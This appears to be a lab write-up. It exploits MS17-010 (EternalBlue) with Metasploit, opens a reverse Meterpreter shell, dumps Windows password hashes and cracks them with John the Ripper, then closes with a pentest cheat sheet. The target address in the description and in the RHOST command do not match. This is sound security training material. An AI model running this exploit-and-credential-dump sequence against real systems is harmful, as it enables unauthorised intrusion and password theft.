# Description

Through our vulnerability scans we learned the host at 10.19.99.10 has the vulnerability known as Microsoft Windows SMB Server Multiple Vulnerabilities.  It is also known as MS17-010 and has CVEs 2017-0143, 144, 145, 146, 147 & 148.  This is a major vulnerability. The goal of this lab will be to harvest the credentials present on the 10.19.99.10 host.  We will do this by exploiting the MS17-010 vulnerability using a tool called Metasploit, extract the hashed credentials from the windows SAM file, and decrypt them.

Next we will see if Metasploit has an exploit for the MS17-010 vulnerability we found on our target host.  Enter the following command:
```zsh
search MS17-010
```
<img src="https://i.imgur.com/aFmS5Ht.png"/>


Using the first listed exploit, issue the `use` command with the name of the desired exploit.  
```zsh
use exploit/windows/smb/ms17_010_eternalblue
```

To discover what payloads are available with this exploit, use the `show` command.
```zsh
show payloads
```

Select payload that will launch a reverse_tcp meterpreter shell.
```zsh
set payload windows/x64/meterpreter/reverse_tcp
```

To discover what options are available with this payload, use the `show` command.
```zsh
show options
```
The RHOST value must be set with a specific target IP.  
```zsh
set RHOST 10.19.99.110
```

<img src="https://i.imgur.com/4H3m874.png"/>


to launch the attack, issue the `exploit` command:
```zsh
exploit
```

To dump the user credentials on this system, issue the `hashdump` command in the meterpreter prompt.
```zsh
hashdump
```

Take the results of the hashdump and save them to a .txt file. Now attempt to crack the passwords in the target file with John the Ripper.
```zsh
john hashes.txt --format=nt
```

<img src="https://i.imgur.com/OotFGJV.png"/>

Write a short checklist of the steps you used during this lab to retrieve and crack passwords.  Write it as a cheat sheet you could use on a future pentest.
- Collect vulnerability to exploit
- Start up Metasploit
- Update Metasploit with the command '`msfupdate`
- Select exploit and search for exploit with the command `search <exploit>`
- From the list of exploits available for the vulnerability, select the desired exploit with command `use <eploit name>`
- With exploit select, to see a list of payloads available, enter the command `show payloads`
- To select a payload, enter the command 'set payload `<payload name>`
- Payloads may have available options, which can be displayed with the command `show options`
- To set the target host for the exploit, use the command 'set RHOST `<target IP>`
- Once ready to execute, use the command `exploit`





